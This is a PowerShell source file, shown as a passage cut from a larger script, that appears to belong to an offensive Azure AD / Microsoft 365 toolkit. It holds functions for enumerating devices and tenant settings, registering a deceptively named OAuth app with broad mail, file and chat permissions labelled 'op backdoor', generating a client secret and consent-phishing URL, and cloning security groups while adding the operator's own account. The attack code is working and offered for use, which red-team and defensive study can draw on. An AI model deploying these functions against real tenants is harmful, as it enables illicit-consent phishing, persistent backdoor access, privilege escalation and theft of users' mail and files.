        Queries all Azure AD-registered devices, showing a live counter while processing, 
        and exports them to a CSV file with detailed device information.

    .EXAMPLE
        Get-Devices
    #>

    $csvFile = "devices.csv"
    $count = 0
    $deviceList = @()

    Write-Host "[*] Retrieving registered devices from Azure AD..." -ForegroundColor Cyan

    try {
        $devices = Get-MgDevice -All
    } catch {
        Write-Host "`n[-] Failed to retrieve devices: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    if (-not $devices) {
        Write-Host "`n[!] No registered devices found." -ForegroundColor Yellow
        return
    }

    foreach ($device in $devices) {
        $owners = ""

        # Fetch device owners (if available)
        try {
            $ownersList = Get-MgDeviceRegisteredOwner -DeviceId $device.Id -ErrorAction Stop
            if ($ownersList) {
                # Filter only User objects and get DisplayName
                $userOwners = $ownersList | Where-Object { $_.AdditionalProperties.displayName } | Select-Object -ExpandProperty AdditionalProperties
                if ($userOwners) {
                    $owners = ($userOwners.displayName) -join ", "
                } else {
                    $owners = "No user owner"
                }
            }
        } catch {
            $owners = "Unknown"
        }

        $deviceList += [PSCustomObject]@{
            "DeviceName"  = $device.DisplayName
            "DeviceID"    = $device.Id
            "OS"          = $device.OperatingSystem
            "OSVersion"   = $device.OperatingSystemVersion
            "Compliant"   = $device.IsCompliant
            "Managed"     = $device.IsManaged
            "TrustType"   = $device.TrustType
            "JoinType"    = $device.DeviceTrustType
            "Owner"       = $owners
        }

        $count++
        Write-Host "`r[*] Devices enumerated: $count" -NoNewline
    }

    $deviceList | Export-Csv -Path $csvFile -NoTypeInformation

    Write-Host "`r[+] $count devices found, exported to devices.csv" -ForegroundColor Green
}

function Get-TenantEnumeration {
    <#
    .SYNOPSIS
        Enumerates Azure AD tenancy details.

    .DESCRIPTION
        Retrieves tenant ID, verified domains, federation settings, external collaboration settings, 
        security defaults, and license information.

    .EXAMPLE
        Get-TenantEnumeration
    #>

    Write-Host "[*] Retrieving Azure AD Tenancy Information..." -ForegroundColor Yellow

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Connect-Graph
    }

    # Fetch basic tenant details
    try {
        $tenant = Get-MgOrganization
        Write-Host "`n[*] Tenant Information:" -ForegroundColor Cyan
        Write-Host "[+] Tenant Name: $($tenant.DisplayName)"
        Write-Host "[+] Tenant ID: $($tenant.Id)"
        Write-Host "[+] Default Domain: $($tenant.VerifiedDomains | Where-Object { $_.IsDefault -eq $true } | Select-Object -ExpandProperty Name)"
    } catch {
        Write-Host "[-] Failed to retrieve tenant details: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Fetch verified domains
    try {
        $domains = Get-MgDomain
        Write-Host "`n[*] Listing Verified Domains:" -ForegroundColor Cyan
        foreach ($domain in $domains) {
            $isFederated = if ($null -ne $domain.AuthenticationType -and $domain.AuthenticationType -eq "Federated") { $true } else { $false }
            Write-Host "[+] $($domain.Id) (Federation Enabled: $isFederated)"
        }
    } catch {
        Write-Host "[-] Failed to retrieve domains: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Fetch federation settings for federated domains only
    Write-Host "`n[*] Checking Federation Configuration..." -ForegroundColor Cyan
    foreach ($domain in $domains) {
        $isFederated = if ($null -ne $domain.AuthenticationType -and $domain.AuthenticationType -eq "Federated") { $true } else { $false }
        
        if ($isFederated) {
            try {
                $federationSettings = Get-MgDomainFederationConfiguration -DomainId $domain.Id -ErrorAction Stop
                if ($federationSettings) {
                    Write-Host "[+] Federated Domain: $($domain.Id)"
                    Write-Host "    [-] Issuer URI: $($federationSettings.IssuerUri)"
                    Write-Host "    [-] Federation Brand Name: $($federationSettings.DisplayName)"
                }
            } catch {
                Write-Host "[!] Failed to retrieve federation settings for $($domain.Id): $($_.Exception.Message)" -ForegroundColor Cyan
            }
        }
    }

    # Fetch external collaboration settings
    try {
        $externalSettings = Get-MgPolicyAuthorizationPolicy
        Write-Host "`n[*] External Collaboration Settings:" -ForegroundColor Cyan
        Write-Host "[+] B2B Guest Access Allowed From: $($externalSettings.AllowInvitesFrom)"
        Write-Host "[+] Guest Users Can Read Directory: $($externalSettings.AllowedToReadOtherUsers)"
    } catch {
        Write-Host "[-] Failed to retrieve external collaboration settings: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Fetch security defaults (handle missing output properly)
    try {
        $securityDefaults = Get-MgPolicyIdentitySecurityDefaultEnforcementPolicy -ErrorAction Stop
        if ($null -ne $securityDefaults -and $securityDefaults.PSObject.Properties.Name -contains "IsEnabled") {
            Write-Host "`n[*] Security Defaults:" -ForegroundColor Cyan
            Write-Host "[+] Enabled: $($securityDefaults.IsEnabled)"
        } else {
            Write-Host "[!] Security Defaults setting not found." -ForegroundColor Cyan
        }
    } catch {
        Write-Host "[-] Failed to retrieve security defaults: $($_.Exception.Message)" -ForegroundColor Red
    }

    # Fetch assigned licenses
    try {
        $licenses = Get-MgSubscribedSku
        Write-Host "`n[*] Listing Assigned Licenses:" -ForegroundColor Cyan
        foreach ($license in $licenses) {
            Write-Host "[+] SKU: $($license.SkuPartNumber) (Enabled Units: $($license.PrepaidUnits.Enabled))"
        }
    } catch {
        Write-Host "[-] Failed to retrieve licenses: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host "`n[*] Completed Azure AD Tenancy Enumeration." -ForegroundColor Green
}


function Invoke-InjectOAuthApp {
    <#
    .SYNOPSIS
        Automates the deployment of an App Registration in an Azure AD tenant.

    .DESCRIPTION
        Creates an App Registration, assigns OAuth permissions, and generates a consent URL.
        This is useful when portal access is restricted, but users can still register apps.

    .PARAMETER AppName
        The display name of the App Registration. 

    .PARAMETER ReplyUrl
        The redirect URL where the OAuth token will be sent.

    .PARAMETER Scope
        Comma-separated Microsoft Graph permissions (e.g., "Mail.Read","User.Read").
        If no scope is provided, it defaults to "op backdoor".

    .PARAMETER Tokens
        (Optional) Pre-authenticated access tokens to use instead of interactive login.
    
    .EXAMPLE
        Invoke-InjectOAuthApp -AppName "WinDefend365" -ReplyUrl "https://windefend.example.com"
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [string]$AppName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]$ReplyUrl,

        [Parameter(Position = 2, Mandatory = $False)]
        [string[]]$Scope,

        [Parameter(Position = 3, Mandatory = $False)]
        [object[]]$Tokens
    )

    # Define default scope groups
    $defaultScopes = @(
        "openid","profile","offline_access","email",
        "User.Read","User.ReadBasic.All",
        "Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared",
        "Files.ReadWrite.All","EWS.AccessAsUser.All",
        "ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create",
        "ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All",
        "Presence.Read.All","Team.ReadBasic.All","Team.Create",
        "Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All",
        "Policy.Read.ConditionalAccess"
    )

    # Default to "op backdoor" permissions if no scope is provided
    if (-not $Scope) {
        Write-Host "[>] No scope provided. Defaulting to 'op backdoor' permissions." -ForegroundColor Cyan
        $Scope = $defaultScopes
    }

    # Authentication
    if ($Tokens) {
        Write-Host "[>] Using provided access tokens." -ForegroundColor Yellow
    } else {
        Write-Host "[>] Authenticating with Microsoft Graph..." -ForegroundColor Cyan
        Connect-Graph
    }

    # Get Microsoft Graph Service Principal
    Write-Host "[>] Retrieving Microsoft Graph Service Principal ID..." -ForegroundColor Cyan
    $graphSP = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
    if (-not $graphSP) {
        Write-Host "[!] Failed to retrieve Microsoft Graph Service Principal." -ForegroundColor Red
        return
    }

    # Resolve scope permissions
    Write-Host "[>] Resolving permission scope IDs..." -ForegroundColor Cyan
    $permissionIds = @()
    foreach ($perm in $Scope) {
        $permObj = $graphSP.Oauth2PermissionScopes | Where-Object { $_.Value -eq $perm }
        if ($permObj) {
            $permissionIds += @{ Id = $permObj.Id; Type = "Scope" }
        } else {
            Write-Host "[!] Could not find permission: $perm" -ForegroundColor Red
        }
    }

    if (-not $permissionIds) {
        Write-Host "[!] No valid permissions found. Aborting." -ForegroundColor Red
        return
    }

    # Create App Registration
    Write-Host "[>] Creating App Registration: $AppName..." -ForegroundColor Cyan
    $app = New-MgApplication -DisplayName $AppName -SignInAudience "AzureADMultipleOrgs" -Web @{ RedirectUris = @($ReplyUrl) }

    if (-not $app) {
        Write-Host "[!] Failed to create App Registration." -ForegroundColor Red
        return
    }

    Write-Host "[+] App Registration created successfully: $($app.DisplayName) (App ID: $($app.AppId))" -ForegroundColor Green

    # Create Service Principal
    Write-Host "[>] Creating Service Principal..." -ForegroundColor Cyan
    $sp = New-MgServicePrincipal -AppId $app.AppId

    if (-not $sp) {
        Write-Host "[!] Failed to create Service Principal." -ForegroundColor Red
        return
    }

    Write-Host "[+] Service Principal created: $($sp.DisplayName)" -ForegroundColor Green

    # Assign permissions
    Write-Host "[>] Assigning OAuth permissions to the App..." -ForegroundColor Cyan
    Update-MgApplication -ApplicationId $app.Id -RequiredResourceAccess @(@{ ResourceAppId = $graphSP.AppId; ResourceAccess = $permissionIds })

    Write-Host "[+] Permissions assigned successfully." -ForegroundColor Green

    # Generate Client Secret
    Write-Host "[>] Generating Client Secret..." -ForegroundColor Cyan
    $secret = Add-MgApplicationPassword -ApplicationId $app.Id -PasswordCredential @{
        DisplayName  = "DefaultSecret"
        StartDateTime = (Get-Date)
        EndDateTime   = (Get-Date).AddYears(1)
    }

    if (-not $secret) {
        Write-Host "[!] Failed to generate Client Secret." -ForegroundColor Red
        return
    }

    Write-Host "[+] Client Secret generated successfully." -ForegroundColor Green

    # Construct Consent URL
    Write-Host "[>] Generating OAuth Consent URL..." -ForegroundColor Cyan
    $scopeParam = ($Scope -join "%20")
    $consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=$($app.AppId)&response_type=code&redirect_uri=$([System.Web.HttpUtility]::UrlEncode($ReplyUrl))&response_mode=query&scope=$scopeParam&state=1234"

    Write-Host "`n[+] Deployment Complete! Here are the details:" -ForegroundColor Green
    Write-Host "--------------------------------------------------------"
    Write-Host "Application ID: $($app.AppId)" -ForegroundColor Green
    Write-Host "Object ID: $($app.Id)" -ForegroundColor Green
    Write-Host "Client Secret: $($secret.SecretText)" -ForegroundColor Green
    Write-Host "OAuth Consent URL: " -ForegroundColor Cyan
    Write-Host "$consentURL"
    Write-Host "--------------------------------------------------------"

    # Provide additional command hints for automatic OAuth flow
    if ($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1") {
        Write-Host "[>] Localhost detected in Reply URL. You can automate OAuth flow using:" -ForegroundColor Cyan
        Write-Host ('Invoke-AutoOAuthFlow -ClientId "' + $app.AppId + '" -ClientSecret "' + $secret.SecretText + '" -RedirectUri "' + $ReplyUrl + '" -scope "' + ($Scope -join ' ') + '"') -ForegroundColor Cyan
    } else {
        Write-Host "[>] Use the following command to complete the OAuth flow manually:" -ForegroundColor Cyan
        Write-Host ('Get-AzureAppTokens -ClientId "' + $app.AppId + '" -ClientSecret "' + $secret.SecretText + '" -RedirectUri "' + $ReplyUrl + '" -scope "' + ($Scope -join ' ') + '" -AuthCode <insert your OAuth Code here>') -ForegroundColor Cyan
    }
}


function Invoke-SecurityGroupCloner {
    <#
    .SYNOPSIS
        Clones a security group in Azure AD, with an option to add your user to the cloned group.

    .DESCRIPTION
        This function allows you to select a security group from Azure AD, clone its members, and optionally add your user.
        The function assumes you are already authenticated with `Connect-Graph`.

    .EXAMPLE
        Invoke-SecurityGroupCloner

    #>

    # Ensure connection to Microsoft Graph
    if (-not (Get-MgContext)) {
        Write-Host -ForegroundColor Yellow "[*] Connecting to Microsoft Graph..."
        Connect-Graph
    }

    Write-Host -ForegroundColor Cyan "[*] Fetching security groups..."
    
    # **FAST SECURITY GROUP RETRIEVAL** (Only gets security groups)
    $groups = Get-MgGroup -Filter "securityEnabled eq true" -All | Select-Object DisplayName, Id

    if (-not $groups) {
        Write-Host -ForegroundColor Red "[!] No security groups found."
        return
    }

    # Display groups for user selection
    $groups | ForEach-Object { Write-Host -ForegroundColor Cyan "[>] $($_.DisplayName)" }

    # Prompt user for a group to clone
    $CloneGroup = ""
    while ($CloneGroup -eq "") {
        Write-Host -ForegroundColor Cyan "[*] Enter the name of the security group you want to clone:"
        $CloneGroup = Read-Host

        if (-not ($groups.DisplayName -contains $CloneGroup)) {
            Write-Host -ForegroundColor Red "[!] Invalid group. Try again."
            $CloneGroup = ""
        }
    }

    # Retrieve the selected group
    $selectedGroup = $groups | Where-Object { $_.DisplayName -eq $CloneGroup }
    $selectedGroupId = $selectedGroup.Id
    Write-Host -ForegroundColor Yellow "[*] Cloning group: $CloneGroup ($selectedGroupId)..."

    # Retrieve the group members
    Write-Host -ForegroundColor Cyan "[*] Fetching members of the group..."
    $members = Get-MgGroupMember -GroupId $selectedGroupId -All

    $memberIds = @()
    foreach ($member in $members) {
        if ($member.'@odata.type' -eq "#microsoft.graph.user") {
            $memberIds += $member.Id
        }
    }

    # Prompt user to add themselves to the cloned group
    Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
    $answer = Read-Host
    if ($answer -match "^(yes|y)$") {
        $currentUser = Get-MgUser -UserId (Get-MgContext).Account
        $memberIds += $currentUser.Id
        Write-Host -ForegroundColor Yellow "[*] Adding your account ($($currentUser.UserPrincipalName)) to the cloned group."
    }

    # Prompt user to add another user
    Write-Host -ForegroundColor Cyan "[*] Do you want to add another user to the cloned group? (Yes/No)"
    $anotherUser = Read-Host
    if ($anotherUser -match "^(yes|y)$") {
        Write-Host -ForegroundColor Cyan "[*] Enter the email address of the user to add:"
        $userEmail = Read-Host

        try {
            $additionalUser = Get-MgUser -Filter "mail eq '$userEmail'"
            if ($additionalUser) {
                $memberIds += $additionalUser.Id
                Write-Host -ForegroundColor Yellow "[*] Adding $userEmail to the cloned group."
            } else {
                Write-Host -ForegroundColor Red "[!] User not found."
            }
        } catch {
            Write-Host -ForegroundColor Red "[!] Error fetching user."
        }
    }

    # Prompt user to rename the cloned group
    Write-Host -ForegroundColor Cyan "[*] Do you want to change the cloned group name? (Yes/No)"
    $renameGroup = Read-Host
    if ($renameGroup -match "^(yes|y)$") {
        Write-Host -ForegroundColor Cyan "[*] Enter the new name for the cloned group:"
        $CloneGroup = Read-Host
    }

    # New Security Group Creation
    Write-Host -ForegroundColor Yellow "[*] Creating new security group: $CloneGroup..."
    $newGroup = $null

    try {
        # Suppress Graph API errors by redirecting error output to $null
        $newGroup = New-MgGroup -BodyParameter @{
            DisplayName = $CloneGroup
            MailEnabled = $false
            SecurityEnabled = $true
            MailNickname = ($CloneGroup -replace " ", "")
        } 2>$null  # Redirects errors to $null (suppress output)

        # **Check if the group was actually created**
        if ($newGroup -and $newGroup.Id) {
            Write-Host -ForegroundColor Green "[+] Successfully created group: $CloneGroup ($($newGroup.Id))"
        } else {
            Write-Host -ForegroundColor Red "[!] Failed to create the group: Insufficient privileges."
            return  # **Exit immediately if creation failed**
        }
    } catch {
        Write-Host -ForegroundColor Red "[!] Failed to create the group: Insufficient privileges."
        return  # **Exit immediately**
    }

    # **Ensure group was created before adding members**
    if ($newGroup -and $newGroup.Id) {
        foreach ($memberId in $memberIds | Select-Object -Unique) {
            try {
                New-MgGroupMember -GroupId $newGroup.Id -DirectoryObjectId $memberId
                Write-Host -ForegroundColor Green "[+] Added member: $($memberId)"
            } catch {
                Write-Host -ForegroundColor Red "[!] Failed to add member $($memberId)."
            }
        }
    }

    Write-Host -ForegroundColor Green "[*] Security group cloning completed."
}

